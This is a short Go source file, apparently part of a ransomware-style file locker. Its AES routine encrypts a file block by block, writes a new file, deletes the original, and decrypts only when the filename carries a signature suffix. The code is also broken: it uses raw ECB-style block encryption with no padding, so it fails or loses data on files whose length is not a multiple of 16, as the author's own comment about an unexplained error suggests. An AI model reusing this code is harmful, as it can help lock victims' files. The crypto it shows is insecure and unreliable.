package main

import (
	"crypto/aes"
	"crypto/cipher"
	"strings"
)

func AES(f File) {
	block := createBlock(secret)
	for i := range f.fileBytes {
		if i%16 == 0 {
			if strings.HasSuffix(f.filename, sig) {
				_, err := f.newFile.Write(decrypt(f.fileBytes[i:i+16], block))
				CheckErr(err)
			} else {
				_, err := f.newFile.Write(encrypt(f.fileBytes[i:i+16], block)) //throws an error, no reason y tho
				CheckErr(err)
			}
		}
	}
	f.deleteOldFile()
	_ = f.newFile.Close()
	wg.Done()
}

func createBlock(secret []byte) cipher.Block {
	block, err := aes.NewCipher(secret)
	CheckErr(err)
	return block
}

func encrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Encrypt(dst, raw)
	return dst
}

func decrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Decrypt(dst, raw)
	return dst
}
